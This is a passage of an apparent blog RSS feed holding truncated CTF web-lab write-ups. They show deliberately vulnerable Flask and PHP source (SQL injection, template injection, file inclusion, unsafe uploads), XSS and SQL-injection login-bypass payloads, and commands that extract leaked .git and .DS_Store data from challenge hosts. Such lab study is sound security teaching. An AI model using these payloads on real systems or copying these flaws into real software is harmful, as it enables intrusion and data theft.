 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, render_template, render_template_string, send_file
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()
app = Flask(__name__)
app.config[&amp;#34;SQLALCHEMY_DATABASE_URI&amp;#34;] = &amp;#34;sqlite:///app.db&amp;#34;
db.init_app(app)

with app.app_context():
 db.session.execute(&amp;#34;&amp;#34;&amp;#34;
 CREATE TABLE IF NOT EXISTS users(
 id Integer PRIMARY KEY,
 username String NOT NULL UNIQUE,
 password String,
 count Integer DEFAULT 0
 );
 &amp;#34;&amp;#34;&amp;#34;)
 db.session.execute(&amp;#34;INSERT OR REPLACE INTO users (username, password) VALUES (&amp;#39;admin&amp;#39;, &amp;#39;FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}&amp;#39;)&amp;#34;)
 db.session.commit()

def login(greet):
 if not greet:
 return send_file(&amp;#39;app.py&amp;#39;, mimetype=&amp;#39;text/plain&amp;#39;)
 else:
 return render_template_string(f&amp;#34;Hello {greet}&amp;#34;)

@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])
def index():
 if request.method == &amp;#34;GET&amp;#34;:
 return render_template(&amp;#39;index.html&amp;#39;)
 else:
 username = request.form.get(&amp;#39;username&amp;#39;, &amp;#39;&amp;#39;)
 password = request.form.get(&amp;#39;password&amp;#39;, &amp;#39;&amp;#39;)
 error = &amp;#39;&amp;#39;
 user = db.session.execute(&amp;#34;SELECT username, password FROM users where username=:username&amp;#34;, {&amp;#34;username&amp;#34;:username}).first()

 if user and user[1] == password:
 return login(request.form.get(&amp;#39;greet&amp;#39;, &amp;#39;&amp;#39;))
 elif not user:
 error += &amp;#34;User doesn&amp;#39;t exist! &amp;#34;

 # New feature! count login failed event
 db.session.execute(&amp;#34;UPDATE users SET count = count + 1 WHERE username=:username&amp;#34;, {&amp;#34;username&amp;#34;: username})
 db.session.commit()
 count = db.session.execute(f&amp;#34;SELECT * FROM users WHERE username=&amp;#39;{username}&amp;#39;&amp;#34;).first() or [0, 0, 0, 0]
 error += f&amp;#39;Login faild count: {count[3]}&amp;#39;

 return render_template(&amp;#39;index.html&amp;#39;, error=error)


if __name__ == &amp;#34;__main__&amp;#34;:
 app.run(host=&amp;#34;0.0.0.0&amp;#34;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/</guid><description>&lt;h1 id="simple-web---0x08lab---particlesjs">
 Simple Web - 0x08(Lab - &lt;code>Particles.js&lt;/code>)
 &lt;a class="anchor" href="#simple-web---0x08lab---particlesjs">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://particles.ctf.zoolab.org">https://particles.ctf.zoolab.org&lt;/a>&lt;/p>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>The website can change the theme of layout. The main goal is to leak admin&amp;rsquo;s cookie.&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;h2 id="exploit---xss">
 Exploit - XSS
 &lt;a class="anchor" href="#exploit---xss">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use burp suit to check if the website has XSS vulnerability.
&lt;img src="https://i.imgur.com/eu4Qqrs.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Try to modify &lt;code>config&lt;/code> parameter
Payload 1: &lt;code>1;alert(123);console.log({x://\&lt;/code>
:::spoiler Response 1&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 url.value = location; config.value = &amp;#39;1;
 alert(123);
 console.log({x://\&amp;#39;; fetch(&amp;#39;/1;alert(123);console.log({x://\.json&amp;#39;).then(r =&amp;gt; r.json()).then(json =&amp;gt; {
 particlesJS(&amp;#34;particles-js&amp;#34;, json)
 })
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>:::
or
Payload 2: &lt;code>&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123);&amp;lt;/script&amp;gt;&lt;/code>
:::spoiler Response 2&lt;/p></description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/</guid><description>&lt;h1 id="simple-web---0x09lab---simple-note">
 Simple Web - 0x09(Lab - Simple Note)
 &lt;a class="anchor" href="#simple-web---0x09lab---simple-note">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://note.ctf.zoolab.org/">https://note.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.wibibi.com/info.php?tid=402">&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const id = location.pathname.split(&amp;#39;/&amp;#39;).pop();

 fetch(`/api/note/${id}`).then(r =&amp;gt; r.json()).then(({ title, content })=&amp;gt;{
 url.value = location;
 titleNode.innerHTML = title;
 contentNode.innerText = content;
 }); 
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;p>For instance, if our &lt;code>$id=47a8aad1b3b82dcd4decd36d&lt;/code>, the &lt;code>script code&lt;/code> will fetch this data as &lt;code>json&lt;/code> file and parse title and content.
&lt;img src="https://i.imgur.com/Nwj6gCQ.png" alt="" />
Then it&amp;rsquo;ll change &lt;code>titleNode&lt;/code> by &lt;code>innerHTML&lt;/code> and change &lt;code>contentNode&lt;/code> by &lt;code>innerText&lt;/code>.
&lt;img src="https://i.imgur.com/H8VdiIb.png" alt="" />&lt;/p></description></item><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/</guid><description>&lt;h1 id="simple-web-0x01lab---gitleak">
 Simple Web 0x01(Lab - &lt;code>gitleak&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x01lab---gitleak">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9000/">http://h4ck3r.quest:9000/&lt;/a>&lt;/p>
&lt;h2 id="exploit---gitleak--basic-git-command">
 Exploit - gitleak + basic Git command
 &lt;a class="anchor" href="#exploit---gitleak--basic-git-command">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Use the extension of Firefox(or Google), &lt;code>Dotgit&lt;/code>, to check if the website actually has &lt;code>git leak problem&lt;/code>
&lt;img src="https://i.imgur.com/ZtMbj9z.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>denny0223/scrabble
To use scrabble tool to leak information&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/denny0223/scrabble.git
$ cd scrabble
$ sudo ./scrabble http://h4ck3r.quest:9000/
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Still no flag
There&amp;rsquo;s &lt;code>flag.php&lt;/code> but still no flag in there. &lt;code>HEAD&lt;/code> said &lt;code>HEAD is now at a0228bd Remove flag.&lt;/code>
Thus, we can look up the history by the command below.&lt;/p></description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/</guid><description>&lt;h1 id="simple-web-0x01lab---hello-from-windows-98">
 Simple Web 0x01(Lab - Hello from Windows 98)
 &lt;a class="anchor" href="#simple-web-0x01lab---hello-from-windows-98">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://windows.ctf.zoolab.org/">https://windows.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;p>Very similar to &lt;a href="https://bernie6401.github.io/nGAjlvyURtOcRBW1XfCfOA">0x07(Lab - &lt;code>HakkaMD&lt;/code>)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 session_start();
 if(isset($_GET[&amp;#39;source&amp;#39;])){
 highlight_file(&amp;#39;./&amp;#39;.$_GET[&amp;#39;source&amp;#39;].&amp;#39;.php&amp;#39;);
 die();
 }
 if(isset($_GET[&amp;#39;name&amp;#39;]) &amp;amp;&amp;amp; $_GET[&amp;#39;name&amp;#39;]!=&amp;#39;&amp;#39;){
 $_SESSION[&amp;#39;name&amp;#39;] = $_GET[&amp;#39;name&amp;#39;];
 header(&amp;#34;Location: /?page=hi.php&amp;#34;);
 die();
 }
 if(!isset($_GET[&amp;#39;page&amp;#39;])){
 header(&amp;#34;Location: /?page=say.php&amp;#34;);
 die();
 }
?&amp;gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
 &amp;lt;title&amp;gt;Hello from Windows 98&amp;lt;/title&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://unpkg.com/98.css&amp;#34; /&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;style&amp;gt;
 body{
 background: url(&amp;#39;blue.png&amp;#39;);
 background-size: cover;
 display: flex;
 align-items: center;
 justify-content: center;
 height: 100vh;
 margin: 0;
 }
&amp;lt;/style&amp;gt;
&amp;lt;/style&amp;gt;
&amp;lt;body&amp;gt;
 &amp;lt;div class=&amp;#34;window&amp;#34; style=&amp;#34;margin: 32px; width: 500px&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar-text&amp;#34;&amp;gt;
 Hello World..
 &amp;lt;/div&amp;gt;
 &amp;lt;div class=&amp;#34;title-bar-controls&amp;#34;&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Minimize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Maximize&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;button aria-label=&amp;#34;Close&amp;#34;&amp;gt;&amp;lt;/button&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;div class=&amp;#34;window-body&amp;#34;&amp;gt;
 &amp;lt;?php include($_GET[&amp;#39;page&amp;#39;]);?&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/</guid><description>&lt;h1 id="simple-web-0x02lab---ds_store">
 Simple Web 0x02(Lab - &lt;code>.DS_Store&lt;/code>)
 &lt;a class="anchor" href="#simple-web-0x02lab---ds_store">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9001/">http://h4ck3r.quest:9001/&lt;/a>&lt;/p>
&lt;h2 id="exploit---ds_store">
 Exploit - &lt;code>.DS_Store&lt;/code>
 &lt;a class="anchor" href="#exploit---ds_store">#&lt;/a>
&lt;/h2>
&lt;p>Clone &lt;code>lijiejie/ds_store_exp&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/lijiejie/ds_store_exp.git
$ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/.DS_Store
[200] http://h4ck3r.quest:9001/super_secret_meowmeow.php
[200] http://h4ck3r.quest:9001/index.php
$ cd h4ck3r.quest_9001
$ cat super_secret_meowmeow.php
FLAG{.DS_Store is so annoying lmao}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, must install &lt;code>python 2&lt;/code>, &lt;code>requests&lt;/code>, &lt;code>ds_store&lt;/code> and modify &lt;code>queue&lt;/code>(&lt;code>import queue&lt;/code>→&lt;code>import Queue as queue&lt;/code>)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py2.7 python=2.7
$ conda install -c auto ds_store
$ conda install -c anaconda requests
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bobbyhadz.com/blog/python-no-module-named-queue">python-no-module-named-queue&lt;/a>&lt;/p></description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/</guid><description>&lt;h1 id="simple-web-0x03lab---log-me-in--revenge">
 Simple Web 0x03(Lab - Log me in + Revenge)
 &lt;a class="anchor" href="#simple-web-0x03lab---log-me-in--revenge">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8200/">http://h4ck3r.quest:8200/&lt;/a>
Challenge: &lt;a href="http://h4ck3r.quest:8201/">http://h4ck3r.quest:8201/&lt;/a>&lt;/p>
&lt;h2 id="exploit---sqli">
 Exploit - &lt;code>SQLi&lt;/code>
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
&lt;/ul>
&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
&lt;h2 id="revenge-source-code">
 Revenge source code
 &lt;a class="anchor" href="#revenge-source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">from flask import Flask, render_template, redirect, request, g, Response
import sqlite3

app = Flask(__name__)


def get_db():
 db = getattr(g, &amp;#39;_database&amp;#39;, None)
 if db is None:
 db = g._database = sqlite3.connect(&amp;#39;/tmp/database.db&amp;#39;)
 db.row_factory = sqlite3.Row
 return db


@app.before_first_request
def init_db():
 cursor = get_db().cursor()
 cursor.execute(&amp;#34;&amp;#34;&amp;#34;
 CREATE TABLE IF NOT EXISTS &amp;#34;admin&amp;#34; (
 &amp;#34;username&amp;#34; TEXT NOT NULL,
 &amp;#34;password&amp;#34; TEXT NOT NULL
 )
 &amp;#34;&amp;#34;&amp;#34;)
 cursor.execute(&amp;#34;SELECT COUNT(*) as count FROM admin WHERE username=&amp;#39;admin&amp;#39;&amp;#34;)
 count = cursor.fetchone()[&amp;#39;count&amp;#39;]
 if count == 0:
 import secrets
 cursor.execute(&amp;#34;INSERT INTO admin (username, password) VALUES (?,?)&amp;#34;,
 (&amp;#39;admin&amp;#39;, secrets.token_urlsafe()))
 get_db().commit()


@app.teardown_appcontext
def close_connection(exception):
 db = getattr(g, &amp;#39;_database&amp;#39;, None)
 if db is not None:
 db.close()


@app.route(&amp;#34;/&amp;#34;)
def home():
 return render_template(&amp;#34;index.html&amp;#34;,
 failed=request.args.get(&amp;#39;failed&amp;#39;) != None)


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 username = request.form.get(&amp;#39;username&amp;#39;)
 password = request.form.get(&amp;#39;password&amp;#39;)

 if not username or not password:
 return redirect(&amp;#34;/?failed&amp;#34;)

 cur = get_db().execute(f&amp;#34;SELECT * FROM admin WHERE (username=&amp;#39;{username}&amp;#39;)&amp;#34;)
 res = cur.fetchone()
 cur.close()

 if res[&amp;#39;username&amp;#39;] == &amp;#39;admin&amp;#39; and res[&amp;#39;password&amp;#39;] == password:
 return &amp;#34;FLAG: FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#34;

 return redirect(&amp;#34;/?failed&amp;#34;)



@app.route(&amp;#34;/source&amp;#34;)
def source():
 import re
 source_code = open(__file__).read()
 source_code = re.sub(r&amp;#39;FLAG{[^}\s]+}&amp;#39;, &amp;#39;FLAG{&amp;lt;REDACTED&amp;gt;}&amp;#39;, source_code, 1)
 return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)


if __name__ == &amp;#39;__main__&amp;#39;:
 app.run(debug=True)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/</guid><description>&lt;h1 id="simple-web-0x04lab---image-space-0x01">
 Simple Web 0x04(Lab - Image Space 0x01)
 &lt;a class="anchor" href="#simple-web-0x04lab---image-space-0x01">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9010">http://h4ck3r.quest:9010&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;!-- upload form --&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/</guid><description>&lt;h1 id="simple-web-0x05lab---image-space-0x02">
 Simple Web 0x05(Lab - Image Space 0x02)
 &lt;a class="anchor" href="#simple-web-0x05lab---image-space-0x02">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9011">http://h4ck3r.quest:9011&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);

 if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
 die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
 }

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/</guid><description>&lt;h1 id="simple-web-0x06lab---image-space-0x03">
 Simple Web 0x06(Lab - Image Space 0x03)
 &lt;a class="anchor" href="#simple-web-0x06lab---image-space-0x03">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9012">http://h4ck3r.quest:9012&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures">file signature&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php!=" data-lang="php!="> &amp;lt;?php
 if (isset($_GET[&amp;#39;source&amp;#39;])) {
 highlight_file(__FILE__);
 exit;
 }
?&amp;gt;
&amp;lt;h1&amp;gt;Image Uploader&amp;lt;/h1&amp;gt;
&amp;lt;p&amp;gt;Only supports: jpg, jpeg, png&amp;lt;/p&amp;gt;
&amp;lt;form action=&amp;#34;index.php&amp;#34; method=&amp;#34;POST&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;file&amp;#34; name=&amp;#34;image_file&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Upload&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;View Source&amp;lt;/a&amp;gt;
&amp;lt;/p&amp;gt;
&amp;lt;?php
 if (!isset($_FILES[&amp;#39;image_file&amp;#39;])) {
 die(&amp;#39;Give me a file!&amp;#39;);
 }

 $filename = basename($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;name&amp;#39;]);
 $extension = strtolower(explode(&amp;#34;.&amp;#34;, $filename)[1]);

 if (!in_array($extension, [&amp;#39;png&amp;#39;, &amp;#39;jpeg&amp;#39;, &amp;#39;jpg&amp;#39;]) !== false) {
 die(&amp;#34;Invalid file extension: $extension.&amp;#34;);
 }

 if (in_array($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;type&amp;#39;], [&amp;#34;image/png&amp;#34;, &amp;#34;image/jpeg&amp;#34;, &amp;#34;image/jpg&amp;#34;]) === false) {
 die(&amp;#34;Invalid file type: &amp;#34; . $_SERVER[&amp;#34;CONTENT_TYPE&amp;#34;]);
 }

 list($_, $_, $type) = getimagesize($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]);

 if ($type !== IMAGETYPE_JPEG &amp;amp;&amp;amp; $type !== IMAGETYPE_PNG) {
 die(&amp;#34;Invalid image type.&amp;#34;);
 }

 $prefix = bin2hex(random_bytes(8));
 move_uploaded_file($_FILES[&amp;#39;image_file&amp;#39;][&amp;#39;tmp_name&amp;#39;], &amp;#34;images/${prefix}_${filename}&amp;#34;);
 echo &amp;#34;&amp;lt;img src=\&amp;#34;/images/${prefix}_${filename}\&amp;#34;&amp;gt;&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::
